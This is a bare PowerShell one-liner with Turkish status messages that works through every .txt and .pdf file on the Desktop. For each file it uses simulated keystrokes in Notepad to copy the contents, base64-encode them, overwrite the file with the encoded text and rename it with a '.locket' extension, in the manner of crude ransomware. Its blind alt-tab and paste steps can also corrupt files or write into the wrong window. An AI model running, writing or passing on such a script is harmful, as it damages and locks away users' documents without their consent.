Add-Type -AssemblyName System.Windows.Forms;$d=[Environment]::GetFolderPath("Desktop");$e=@("txt","pdf");foreach($x in $e){$f=Get-ChildItem -Path $d -Filter *.$x -File;foreach($y in $f){$p=$y.FullName;Write-Output "İşleniyor $p";Start-Process notepad;Start-Sleep 1.5;[System.Windows.Forms.SendKeys]::SendWait("^o");Start-Sleep 1;[System.Windows.Forms.SendKeys]::SendWait($p);Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("{ENTER}");Start-Sleep 1.5;[System.Windows.Forms.SendKeys]::SendWait("^a");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^c");Start-Sleep 0.5;$c=Get-Clipboard -Raw;$b=[Text.Encoding]::UTF8.GetBytes($c);$B64=[Convert]::ToBase64String($b);Set-Clipboard -Value $B64;Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("%{TAB}");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^a");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("{DEL}");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^v");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^s");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("%{F4}");Start-Sleep 1;$nn=$y.FullName+".locket";try{Rename-Item -Path $y.FullName -NewName $nn -Force}catch{Write-Output "Uzantı değiştirilemedi $($y.Name)"}}}
